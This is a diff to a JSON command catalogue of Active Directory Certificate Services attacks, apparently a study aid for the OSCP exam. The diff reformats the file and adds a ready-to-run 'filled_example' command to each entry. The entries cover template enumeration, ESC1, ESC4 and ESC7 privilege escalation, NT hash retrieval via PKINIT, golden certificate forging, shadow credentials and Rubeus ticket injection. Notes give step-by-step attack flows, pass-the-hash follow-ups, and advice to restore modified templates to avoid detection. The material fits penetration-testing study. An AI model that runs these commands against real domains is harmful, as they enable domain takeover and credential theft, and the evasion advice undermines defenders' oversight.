@@ -8,12 +8,39 @@
       "category": "enumeration",
       "subcategory": "active-directory",
       "variables": [
-        {"name": "<USERNAME>", "description": "Domain username", "example": "user", "required": true},
-        {"name": "<DOMAIN>", "description": "Domain name (FQDN)", "example": "corp.local", "required": true},
-        {"name": "<PASSWORD>", "description": "User password", "example": "Password123", "required": true},
-        {"name": "<DC_IP>", "description": "Domain controller IP", "example": "192.168.50.70", "required": true}
+        {
+          "name": "<USERNAME>",
+          "description": "Domain username",
+          "example": "user",
+          "required": true
+        },
+        {
+          "name": "<DOMAIN>",
+          "description": "Domain name (FQDN)",
+          "example": "corp.local",
+          "required": true
+        },
+        {
+          "name": "<PASSWORD>",
+          "description": "User password",
+          "example": "Password123",
+          "required": true
+        },
+        {
+          "name": "<DC_IP>",
+          "description": "Domain controller IP",
+          "example": "192.168.50.70",
+          "required": true
+        }
       ],
-      "tags": ["ACTIVE_DIRECTORY", "ADCS", "CERTIFICATE", "ENUMERATION", "LINUX", "OSCP:HIGH"],
+      "tags": [
+        "ACTIVE_DIRECTORY",
+        "ADCS",
+        "CERTIFICATE",
+        "ENUMERATION",
+        "LINUX",
+        "OSCP:HIGH"
+      ],
       "flag_explanations": {
         "-u": "Username in UPN format (user@domain)",
         "-p": "Password for authentication",
@@ -23,17 +50,32 @@
         "-old-bloodhound": "Output BloodHound 4.x compatible format",
         "-text": "Output text format instead of JSON"
       },
-      "success_indicators": ["[*] Finding vulnerable certificate templates", "ESC1", "ESC4", "Enrollee Supplies Subject"],
-      "failure_indicators": ["Connection refused", "Invalid credentials", "[-] Got error"],
-      "next_steps": ["certipy-req-esc1", "certipy-req-esc4"],
-      "alternatives": ["certify-find"],
+      "success_indicators": [
+        "[*] Finding vulnerable certificate templates",
+        "ESC1",
+        "ESC4",
+        "Enrollee Supplies Subject"
+      ],
+      "failure_indicators": [
+        "Connection refused",
+        "Invalid credentials",
+        "[-] Got error"
+      ],
+      "next_steps": [
+        "certipy-req-esc1",
+        "certipy-req-esc4"
+      ],
+      "alternatives": [
+        "certify-find"
+      ],
       "prerequisites": [],
       "troubleshooting": {
         "Connection refused": "Check DC IP and port 389/636 accessibility",
         "Invalid credentials": "Verify username format (user@domain) and password"
       },
       "notes": "CERTIPY is the primary Linux tool for ADCS enumeration and exploitation.\n\nWHAT IT FINDS:\n- ESC1: Template allows requestor to supply Subject Alternative Name (SAN)\n- ESC2: Template has 'Any Purpose' EKU or no EKU\n- ESC3: Certificate Request Agent templates\n- ESC4: Vulnerable template ACLs (WriteDacl, WriteOwner, etc.)\n- ESC5: Vulnerable PKI object ACLs\n- ESC6: EDITF_ATTRIBUTESUBJECTALTNAME2 flag on CA\n- ESC7: ManageCA/ManageCertificates permissions\n- ESC8: HTTP enrollment with NTLM relay\n- ESC9-13: Various certificate binding weaknesses\n\nOSCP TIP:\nADCS is increasingly common in exams. ESC1 and ESC4 are most exploitable.",
-      "oscp_relevance": "high"
+      "oscp_relevance": "high",
+      "filled_example": "certipy find -u 'user@corp.local' -p 'Password123' -dc-ip 192.168.50.70 -vulnerable -stdout"
     },
     {
       "id": "certipy-req-esc1",
@@ -43,32 +85,88 @@
       "category": "exploitation",
       "subcategory": "active-directory",
       "variables": [
-        {"name": "<USERNAME>", "description": "Attacker username", "example": "user", "required": true},
-        {"name": "<DOMAIN>", "description": "Domain name", "example": "corp.local", "required": true},
-        {"name": "<PASSWORD>", "description": "Attacker password", "required": true},
-        {"name": "<CA_NAME>", "description": "Certificate Authority name from certipy find", "example": "corp-CA", "required": true},
-        {"name": "<CA_HOST>", "description": "CA server hostname/IP", "example": "ca.corp.local", "required": true},
-        {"name": "<TEMPLATE>", "description": "Vulnerable template name", "example": "UserAuth", "required": true},
-        {"name": "<TARGET_USER>", "description": "User to impersonate", "example": "administrator", "required": true}
+        {
+          "name": "<USERNAME>",
+          "description": "Attacker username",
+          "example": "user",
+          "required": true
+        },
+        {
+          "name": "<DOMAIN>",
+          "description": "Domain name",
+          "example": "corp.local",
+          "required": true
+        },
+        {
+          "name": "<PASSWORD>",
+          "description": "Attacker password",
+          "required": true
+        },
+        {
+          "name": "<CA_NAME>",
+          "description": "Certificate Authority name from certipy find",
+          "example": "corp-CA",
+          "required": true
+        },
+        {
+          "name": "<CA_HOST>",
+          "description": "CA server hostname/IP",
+          "example": "ca.corp.local",
+          "required": true
+        },
+        {
+          "name": "<TEMPLATE>",
+          "description": "Vulnerable template name",
+          "example": "UserAuth",
+          "required": true
+        },
+        {
+          "name": "<TARGET_USER>",
+          "description": "User to impersonate",
+          "example": "administrator",
+          "required": true
+        }
       ],
-      "tags": ["ACTIVE_DIRECTORY", "ADCS", "ESC1", "CERTIFICATE", "PRIVILEGE_ESCALATION", "LINUX", "OSCP:HIGH"],
+      "tags": [
+        "ACTIVE_DIRECTORY",
+        "ADCS",
+        "ESC1",
+        "CERTIFICATE",
+        "PRIVILEGE_ESCALATION",
+        "LINUX",
+        "OSCP:HIGH"
+      ],
       "flag_explanations": {
         "-ca": "Certificate Authority name (from certipy find output)",
         "-target": "CA server hostname or IP",
         "-template": "Vulnerable certificate template name",
         "-upn": "User Principal Name to impersonate in the certificate"
       },
-      "success_indicators": ["[*] Saved certificate and private key", ".pfx"],
-      "failure_indicators": ["CERTSRV_E_TEMPLATE_DENIED", "Access denied", "[-] Got error"],
-      "next_steps": ["certipy-auth"],
-      "alternatives": ["certify-request"],
-      "prerequisites": ["certipy-find"],
+      "success_indicators": [
+        "[*] Saved certificate and private key",
+        ".pfx"
+      ],
+      "failure_indicators": [
+        "CERTSRV_E_TEMPLATE_DENIED",
+        "Access denied",
+        "[-] Got error"
+      ],
+      "next_steps": [
+        "certipy-auth"
+      ],
+      "alternatives": [
+        "certify-request"
+      ],
+      "prerequisites": [
+        "certipy-find"
+      ],
       "troubleshooting": {
         "CERTSRV_E_TEMPLATE_DENIED": "User cannot enroll in this template - check ACLs",
         "Template not found": "Verify exact template name from certipy find"
       },
       "notes": "ESC1 ATTACK:\nTemplates with 'CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT' allow requestor to specify the Subject Alternative Name (SAN).\n\nThis means you can request a certificate for ANY user (including administrator@domain).\n\nATTACK FLOW:\n1. certipy find -vulnerable (identify ESC1 templates)\n2. certipy req -upn administrator@domain (request cert as admin)\n3. certipy auth -pfx admin.pfx (authenticate with cert to get NT hash)\n\nREQUIREMENTS:\n- Template must allow client authentication (EKU)\n- Attacker must have enrollment rights on template\n- CA must be accessible\n\nOSCP TIP:\nESC1 is the most common and easiest ADCS attack. Always check for it first.",
-      "oscp_relevance": "high"
+      "oscp_relevance": "high",
+      "filled_example": "certipy req -u 'user@corp.local' -p 'P@ssw0rd123!' -ca 'corp-CA' -target 'ca.corp.local' -template 'UserAuth' -upn 'administrator@corp.local'"
     },
     {
       "id": "certipy-auth",
@@ -78,27 +176,58 @@
       "category": "exploitation",
       "subcategory": "active-directory",
       "variables": [
-        {"name": "<PFX_FILE>", "description": "Certificate file from certipy req", "example": "administrator.pfx", "required": true},
-        {"name": "<DC_IP>", "description": "Domain controller IP", "example": "192.168.50.70", "required": true}
+        {
+          "name": "<PFX_FILE>",
+          "description": "Certificate file from certipy req",
+          "example": "administrator.pfx",
+          "required": true
+        },
+        {
+          "name": "<DC_IP>",
+          "description": "Domain controller IP",
+          "example": "192.168.50.70",
+          "required": true
+        }
       ],
-      "tags": ["ACTIVE_DIRECTORY", "ADCS", "CERTIFICATE", "PKINIT", "AUTHENTICATION", "LINUX", "OSCP:HIGH"],
+      "tags": [
+        "ACTIVE_DIRECTORY",
+        "ADCS",
+        "CERTIFICATE",
+        "PKINIT",
+        "AUTHENTICATION",
+        "LINUX",
+        "OSCP:HIGH"
+      ],
       "flag_explanations": {
         "-pfx": "PFX certificate file containing cert and private key",
         "-dc-ip": "Domain controller for PKINIT authentication",
         "-domain": "Override domain (optional)",
         "-username": "Override username (optional)"
       },
-      "success_indicators": ["[*] Got hash for", "NT:"],
-      "failure_indicators": ["KDC_ERR_CLIENT_NOT_TRUSTED", "KDC_ERR_PADATA_TYPE_NOSUPP"],
-      "next_steps": ["psexec-shell", "evil-winrm-shell", "wmiexec-shell"],
+      "success_indicators": [
+        "[*] Got hash for",
+        "NT:"
+      ],
+      "failure_indicators": [
+        "KDC_ERR_CLIENT_NOT_TRUSTED",
+        "KDC_ERR_PADATA_TYPE_NOSUPP"
+      ],
+      "next_steps": [
+        "psexec-shell",
+        "evil-winrm-shell",
+        "wmiexec-shell"
+      ],
       "alternatives": [],
-      "prerequisites": ["certipy-req-esc1"],
+      "prerequisites": [
+        "certipy-req-esc1"
+      ],
       "troubleshooting": {
         "KDC_ERR_PADATA_TYPE_NOSUPP": "DC does not support PKINIT - try older DC or different attack",
         "KDC_ERR_CLIENT_NOT_TRUSTED": "Certificate not trusted - check CA chain"
       },
       "notes": "PKINIT AUTHENTICATION:\nUses certificate to request TGT via Kerberos PKINIT.\n\nThe DC returns the user's NT hash encrypted with the session key.\n\nCertipy extracts this hash for pass-the-hash attacks.\n\nOUTPUT:\nReturns NT hash that can be used with:\n- Evil-WinRM: evil-winrm -i <target> -u <user> -H <hash>\n- PSExec: impacket-psexec <domain>/<user>@<target> -hashes :<hash>\n- CrackMapExec: cme smb <target> -u <user> -H <hash>",
-      "oscp_relevance": "high"
+      "oscp_relevance": "high",
+      "filled_example": "certipy auth -pfx 'administrator.pfx' -dc-ip 192.168.50.70"
     },
     {
       "id": "certipy-req-esc4",
@@ -108,27 +237,65 @@
       "category": "exploitation",
       "subcategory": "active-directory",
       "variables": [
-        {"name": "<USERNAME>", "description": "User with template write access", "example": "user", "required": true},
-        {"name": "<DOMAIN>", "description": "Domain name", "example": "corp.local", "required": true},
-        {"name": "<PASSWORD>", "description": "User password", "required": true},
-        {"name": "<TEMPLATE>", "description": "Template with vulnerable ACLs", "example": "UserAuth", "required": true}
+        {
+          "name": "<USERNAME>",
+          "description": "User with template write access",
+          "example": "user",
+          "required": true
+        },
+        {
+          "name": "<DOMAIN>",
+          "description": "Domain name",
+          "example": "corp.local",
+          "required": true
+        },
+        {
+          "name": "<PASSWORD>",
+          "description": "User password",
+          "required": true
+        },
+        {
+          "name": "<TEMPLATE>",
+          "description": "Template with vulnerable ACLs",
+          "example": "UserAuth",
+          "required": true
+        }
       ],
-      "tags": ["ACTIVE_DIRECTORY", "ADCS", "ESC4", "CERTIFICATE", "PRIVILEGE_ESCALATION", "LINUX", "OSCP:HIGH"],
+      "tags": [
+        "ACTIVE_DIRECTORY",
+        "ADCS",
+        "ESC4",
+        "CERTIFICATE",
+        "PRIVILEGE_ESCALATION",
+        "LINUX",
+        "OSCP:HIGH"
+      ],
       "flag_explanations": {
         "-template": "Template name to modify",
         "-save-old": "Save original template config for restoration",
         "-configuration": "Custom configuration file (optional)"
       },
-      "success_indicators": ["[*] Saved old configuration", "[*] Updated template"],
-      "failure_indicators": ["Access denied", "[-] Got error"],
-      "next_steps": ["certipy-req-esc1"],
+      "success_indicators": [
+        "[*] Saved old configuration",
+        "[*] Updated template"
+      ],
+      "failure_indicators": [
+        "Access denied",
+        "[-] Got error"
+      ],
+      "next_steps": [
+        "certipy-req-esc1"
+      ],
       "alternatives": [],
-      "prerequisites": ["certipy-find"],
+      "prerequisites": [
+        "certipy-find"
+      ],
       "troubleshooting": {
         "Access denied": "User does not have write access to template"
       },
       "notes": "ESC4 ATTACK:\nIf you have WriteDacl/WriteOwner/GenericAll on a certificate template, you can modify it to enable ESC1.\n\nATTACK FLOW:\n1. certipy template -save-old (backup original, enable ESC1 flags)\n2. certipy req -upn administrator@domain (request cert as admin)\n3. certipy template -configuration old.json (restore original template)\n4. certipy auth -pfx admin.pfx (use cert to get hash)\n\nALWAYS RESTORE:\nUse -save-old flag and restore template after attack to avoid detection.",
-      "oscp_relevance": "high"
+      "oscp_relevance": "high",
+      "filled_example": "certipy template -u 'user@corp.local' -p 'P@ssw0rd123!' -template 'UserAuth' -save-old"
     },
     {
       "id": "certipy-req-esc7",
@@ -138,27 +305,64 @@
       "category": "exploitation",
       "subcategory": "active-directory",
       "variables": [
-        {"name": "<CA_NAME>", "description": "Certificate Authority name", "example": "corp-CA", "required": true},
-        {"name": "<USERNAME>", "description": "User with ManageCA rights", "example": "user", "required": true},
-        {"name": "<DOMAIN>", "description": "Domain name", "example": "corp.local", "required": true},
-        {"name": "<PASSWORD>", "description": "User password", "required": true}
+        {
+          "name": "<CA_NAME>",
+          "description": "Certificate Authority name",
+          "example": "corp-CA",
+          "required": true
+        },
+        {
+          "name": "<USERNAME>",
+          "description": "User with ManageCA rights",
+          "example": "user",
+          "required": true
+        },
+        {
+          "name": "<DOMAIN>",
+          "description": "Domain name",
+          "example": "corp.local",
+          "required": true
+        },
+        {
+          "name": "<PASSWORD>",
+          "description": "User password",
+          "required": true
+        }
       ],
-      "tags": ["ACTIVE_DIRECTORY", "ADCS", "ESC7", "CERTIFICATE", "PRIVILEGE_ESCALATION", "LINUX", "OSCP:HIGH"],
+      "tags": [
+        "ACTIVE_DIRECTORY",
+        "ADCS",
+        "ESC7",
+        "CERTIFICATE",
+        "PRIVILEGE_ESCALATION",
+        "LINUX",
+        "OSCP:HIGH"
+      ],
       "flag_explanations": {
         "-ca": "Target Certificate Authority name",
         "-add-officer": "Add user as certificate officer (ManageCertificates)",
         "-enable-template": "Enable a disabled template"
       },
-      "success_indicators": ["[*] Successfully added officer"],
-      "failure_indicators": ["Access denied", "[-] Got error"],
-      "next_steps": ["certipy-req-esc1"],
+      "success_indicators": [
+        "[*] Successfully added officer"
+      ],
+      "failure_indicators": [
+        "Access denied",
+        "[-] Got error"
+      ],
+      "next_steps": [
+        "certipy-req-esc1"
+      ],
       "alternatives": [],
-      "prerequisites": ["certipy-find"],
+      "prerequisites": [
+        "certipy-find"
+      ],
       "troubleshooting": {
         "Access denied": "User does not have ManageCA rights"
       },
       "notes": "ESC7 ATTACK:\nManageCA permission allows modifying CA configuration.\n\nATTACK FLOW:\n1. Add yourself as certificate officer: certipy ca -add-officer\n2. Enable SubjectAltRequireUpn template: certipy ca -enable-template SubjectAltRequireUpn\n3. Request certificate with ESC1: certipy req -template SubjectAltRequireUpn\n4. Authenticate: certipy auth -pfx file.pfx\n\nALTERNATIVE:\nWith ManageCertificates, you can approve pending requests directly.",
-      "oscp_relevance": "high"
+      "oscp_relevance": "high",
+      "filled_example": "certipy ca -ca 'corp-CA' -add-officer 'user' -u 'user@corp.local' -p 'P@ssw0rd123!'"
     },
     {
       "id": "certipy-forge",
@@ -168,28 +372,69 @@
       "category": "exploitation",
       "subcategory": "active-directory",
       "variables": [
-        {"name": "<CA_PFX>", "description": "CA private key file", "example": "ca.pfx", "required": true},
-        {"name": "<TARGET_USER>", "description": "User to forge certificate for", "example": "administrator", "required": true},
-        {"name": "<DOMAIN>", "description": "Domain name", "example": "corp.local", "required": true},
-        {"name": "<DC1>", "description": "First DC component", "example": "corp", "required": true},
-        {"name": "<DC2>", "description": "Second DC component", "example": "local", "required": true}
+        {
+          "name": "<CA_PFX>",
+          "description": "CA private key file",
+          "example": "ca.pfx",
+          "required": true
+        },
+        {
+          "name": "<TARGET_USER>",
+          "description": "User to forge certificate for",
+          "example": "administrator",
+          "required": true
+        },
+        {
+          "name": "<DOMAIN>",
+          "description": "Domain name",
+          "example": "corp.local",
+          "required": true
+        },
+        {
+          "name": "<DC1>",
+          "description": "First DC component",
+          "example": "corp",
+          "required": true
+        },
+        {
+          "name": "<DC2>",
+          "description": "Second DC component",
+          "example": "local",
+          "required": true
+        }
       ],
-      "tags": ["ACTIVE_DIRECTORY", "ADCS", "GOLDEN_CERT", "CERTIFICATE", "PERSISTENCE", "LINUX", "OSCP:MEDIUM"],
+      "tags": [
+        "ACTIVE_DIRECTORY",
+        "ADCS",
+        "GOLDEN_CERT",
+        "CERTIFICATE",
+        "PERSISTENCE",
+        "LINUX",
+        "OSCP:MEDIUM"
+      ],
       "flag_explanations": {
         "-ca-pfx": "CA private key in PFX format",
         "-upn": "User Principal Name for the forged certificate",
         "-subject": "Certificate subject DN"
       },
-      "success_indicators": ["[*] Saved forged certificate"],
-      "failure_indicators": ["Invalid PFX", "[-] Got error"],
-      "next_steps": ["certipy-auth"],
+      "success_indicators": [
+        "[*] Saved forged certificate"
+      ],
+      "failure_indicators": [
+        "Invalid PFX",
+        "[-] Got error"
+      ],
+      "next_steps": [
+        "certipy-auth"
+      ],
       "alternatives": [],
       "prerequisites": [],
       "troubleshooting": {
         "Invalid PFX": "CA private key file is corrupted or wrong format"
       },
       "notes": "GOLDEN CERTIFICATE:\nSimilar to Golden Ticket but uses CA private key instead of krbtgt hash.\n\nIf CA private key is compromised (via backup, DPAPI, etc.), you can forge certificates for ANY user.\n\nREQUIRES:\n- CA private key (obtained via backup theft, DPAPI, or CA server compromise)\n\nPERSISTENCE:\nGolden certs remain valid until CA key is rotated (rarely done).",
-      "oscp_relevance": "medium"
+      "oscp_relevance": "medium",
+      "filled_example": "certipy forge -ca-pfx 'ca.pfx' -upn 'administrator@corp.local' -subject 'CN=administrator,CN=Users,DC=corp,DC=local'"
     },
     {
       "id": "certipy-shadow",
@@ -199,27 +444,63 @@
       "category": "exploitation",
       "subcategory": "active-directory",
       "variables": [
-        {"name": "<USERNAME>", "description": "User with GenericWrite on target", "example": "user", "required": true},
-        {"name": "<DOMAIN>", "description": "Domain name", "example": "corp.local", "required": true},
-        {"name": "<PASSWORD>", "description": "User password", "required": true},
-        {"name": "<TARGET_ACCOUNT>", "description": "Target account to compromise", "example": "DC01$", "required": true}
+        {
+          "name": "<USERNAME>",
+          "description": "User with GenericWrite on target",
+          "example": "user",
+          "required": true
+        },
+        {
+          "name": "<DOMAIN>",
+          "description": "Domain name",
+          "example": "corp.local",
+          "required": true
+        },
+        {
+          "name": "<PASSWORD>",
+          "description": "User password",
+          "required": true
+        },
+        {
+          "name": "<TARGET_ACCOUNT>",
+          "description": "Target account to compromise",
+          "example": "DC01$",
+          "required": true
+        }
       ],
-      "tags": ["ACTIVE_DIRECTORY", "ADCS", "SHADOW_CREDENTIALS", "PRIVILEGE_ESCALATION", "LINUX", "OSCP:HIGH"],
+      "tags": [
+        "ACTIVE_DIRECTORY",
+        "ADCS",
+        "SHADOW_CREDENTIALS",
+        "PRIVILEGE_ESCALATION",
+        "LINUX",
+        "OSCP:HIGH"
+      ],
       "flag_explanations": {
         "shadow": "Shadow credentials subcommand",
         "auto": "Automatic attack mode",
         "-account": "Target account to add shadow credentials to"
       },
-      "success_indicators": ["[*] Saved PFX", "[*] Got hash"],
-      "failure_indicators": ["Access denied", "[-] Got error"],
-      "next_steps": ["psexec-shell", "evil-winrm-shell"],
-      "alternatives": ["pywhisker"],
+      "success_indicators": [
+        "[*] Saved PFX",
+        "[*] Got hash"
+      ],
+      "failure_indicators": [
+        "Access denied",
+        "[-] Got error"
+      ],
+      "next_steps": [
+        "psexec-shell",
+        "evil-winrm-shell"
+      ],
+      "alternatives": [],
       "prerequisites": [],
       "troubleshooting": {
         "Access denied": "User lacks GenericWrite/GenericAll on target"
       },
       "notes": "SHADOW CREDENTIALS:\nAdds key credential link to target's msDS-KeyCredentialLink attribute.\n\nAllows certificate-based authentication as that account.\n\nREQUIRES:\n- GenericWrite/GenericAll/WriteProperty on target account\n- ADCS with working PKINIT\n\nUSE CASES:\n- Compromise computer accounts (DC01$)\n- Compromise service accounts\n- Lateral movement without password",
-      "oscp_relevance": "high"
+      "oscp_relevance": "high",
+      "filled_example": "certipy shadow auto -u 'user@corp.local' -p 'P@ssw0rd123!' -account 'DC01$'"
     },
     {
       "id": "certify-find",
@@ -229,17 +510,35 @@
       "category": "enumeration",
       "subcategory": "active-directory",
       "variables": [],
-      "tags": ["ACTIVE_DIRECTORY", "ADCS", "CERTIFICATE", "ENUMERATION", "WINDOWS", "OSCP:HIGH"],
+      "tags": [
+        "ACTIVE_DIRECTORY",
+        "ADCS",
+        "CERTIFICATE",
+        "ENUMERATION",
+        "WINDOWS",
+        "OSCP:HIGH"
+      ],
       "flag_explanations": {
         "find": "Enumerate certificate templates and CAs",
         "/vulnerable": "Only show vulnerable configurations",
         "/domain": "Specify target domain",
         "/ca": "Specify CA to query"
       },
-      "success_indicators": ["Vulnerable Certificates Templates", "ESC1", "ESC4"],
-      "failure_indicators": ["Access denied", "No vulnerable templates"],
-      "next_steps": ["certify-request"],
-      "alternatives": ["certipy-find"],
+      "success_indicators": [
+        "Vulnerable Certificates Templates",
+        "ESC1",
+        "ESC4"
+      ],
+      "failure_indicators": [
+        "Access denied",
+        "No vulnerable templates"
+      ],
+      "next_steps": [
+        "certify-request"
+      ],
+      "alternatives": [
+        "certipy-find"
+      ],
       "prerequisites": [],
       "troubleshooting": {
         "Access denied": "Run from domain-joined system with valid credentials"
@@ -255,26 +554,61 @@
       "category": "exploitation",
       "subcategory": "active-directory",
       "variables": [
-        {"name": "<CA_NAME>", "description": "CA server and name", "example": "ca.corp.local\\corp-CA", "required": true},
-        {"name": "<TEMPLATE>", "description": "Vulnerable template name", "example": "UserAuth", "required": true},
-        {"name": "<TARGET_USER>", "description": "User to impersonate", "example": "administrator", "required": true}
+        {
+          "name": "<CA_NAME>",
+          "description": "CA server and name",
+          "example": "ca.corp.local\\corp-CA",
+          "required": true
+        },
+        {
+          "name": "<TEMPLATE>",
+          "description": "Vulnerable template name",
+          "example": "UserAuth",
+          "required": true
+        },
+        {
+          "name": "<TARGET_USER>",
+          "description": "User to impersonate",
+          "example": "administrator",
+          "required": true
+        }
       ],
-      "tags": ["ACTIVE_DIRECTORY", "ADCS", "CERTIFICATE", "EXPLOITATION", "WINDOWS", "OSCP:HIGH"],
+      "tags": [
+        "ACTIVE_DIRECTORY",
+        "ADCS",
+        "CERTIFICATE",
+        "EXPLOITATION",
+        "WINDOWS",
+        "OSCP:HIGH"
+      ],
       "flag_explanations": {
         "/ca": "Certificate Authority in format server\\CAname",
         "/template": "Template to use for request",
         "/altname": "Subject Alternative Name (user to impersonate)"
       },
-      "success_indicators": ["Certificate:", "-----BEGIN CERTIFICATE-----"],
-      "failure_indicators": ["Access denied", "Template not found"],
-      "next_steps": ["rubeus-asktgt-cert"],
-      "alternatives": ["certipy-req-esc1"],
-      "prerequisites": ["certify-find"],
+      "success_indicators": [
+        "Certificate:",
+        "-----BEGIN CERTIFICATE-----"
+      ],
+      "failure_indicators": [
+        "Access denied",
+        "Template not found"
+      ],
+      "next_steps": [
+        "rubeus-asktgt-cert"
+      ],
+      "alternatives": [
+        "certipy-req-esc1"
+      ],
+      "prerequisites": [
+        "certify-find"
+      ],
       "troubleshooting": {
         "Access denied": "User cannot enroll in template"
       },
       "notes": "After getting certificate:\n1. Convert to PFX: openssl pkcs12 -in cert.pem -keyex -CSP 'Microsoft Enhanced Cryptographic Provider v1.0' -export -out cert.pfx\n2. Use Rubeus: Rubeus.exe asktgt /user:administrator /certificate:cert.pfx /ptt",
-      "oscp_relevance": "high"
+      "oscp_relevance": "high",
+      "filled_example": "Certify.exe request /ca:ca.corp.local\\corp-CA /template:UserAuth /altname:administrator"
     },
     {
       "id": "rubeus-asktgt-cert",
@@ -284,11 +618,33 @@
       "category": "exploitation",
       "subcategory": "active-directory",
       "variables": [
-        {"name": "<TARGET_USER>", "description": "User from certificate", "example": "administrator", "required": true},
-        {"name": "<PFX_FILE>", "description": "Certificate file path", "example": "C:\\Temp\\admin.pfx", "required": true},
-        {"name": "<PFX_PASSWORD>", "description": "PFX file password", "example": "password123", "required": false}
+        {
+          "name": "<TARGET_USER>",
+          "description": "User from certificate",
+          "example": "administrator",
+          "required": true
+        },
+        {
+          "name": "<PFX_FILE>",
+          "description": "Certificate file path",
+          "example": "C:\\Temp\\admin.pfx",
+          "required": true
+        },
+        {
+          "name": "<PFX_PASSWORD>",
+          "description": "PFX file password",
+          "example": "password123",
+          "required": false
+        }
       ],
-      "tags": ["ACTIVE_DIRECTORY", "ADCS", "CERTIFICATE", "KERBEROS", "WINDOWS", "OSCP:HIGH"],
+      "tags": [
+        "ACTIVE_DIRECTORY",
+        "ADCS",
+        "CERTIFICATE",
+        "KERBEROS",
+        "WINDOWS",
+        "OSCP:HIGH"
+      ],
       "flag_explanations": {
         "/user": "Username to request TGT for",
         "/certificate": "Path to PFX certificate file",
@@ -296,16 +652,29 @@
         "/ptt": "Pass-the-Ticket - inject TGT into current session",
         "/nowrap": "Don't wrap Base64 output"
       },
-      "success_indicators": ["[*] Action: Ask TGT", "[+] TGT successfully"],
-      "failure_indicators": ["KDC_ERR_PADATA_TYPE_NOSUPP", "Error"],
-      "next_steps": ["psexec-shell"],
-      "alternatives": ["certipy-auth"],
-      "prerequisites": ["certify-request"],
+      "success_indicators": [
+        "[*] Action: Ask TGT",
+        "[+] TGT successfully"
+      ],
+      "failure_indicators": [
+        "KDC_ERR_PADATA_TYPE_NOSUPP",
+        "Error"
+      ],
+      "next_steps": [
+        "psexec-shell"
+      ],
+      "alternatives": [
+        "certipy-auth"
+      ],
+      "prerequisites": [
+        "certify-request"
+      ],
       "troubleshooting": {
         "KDC_ERR_PADATA_TYPE_NOSUPP": "PKINIT not enabled on DC"
       },
       "notes": "Windows equivalent of certipy auth.\n\nUse /ptt to inject ticket into current session for immediate use.\n\nWithout /ptt, outputs Base64 ticket for later injection.",
-      "oscp_relevance": "high"
+      "oscp_relevance": "high",
+      "filled_example": "Rubeus.exe asktgt /user:administrator /certificate:C:\\Temp\\admin.pfx /password:password123 /ptt"
     }
   ]
 }
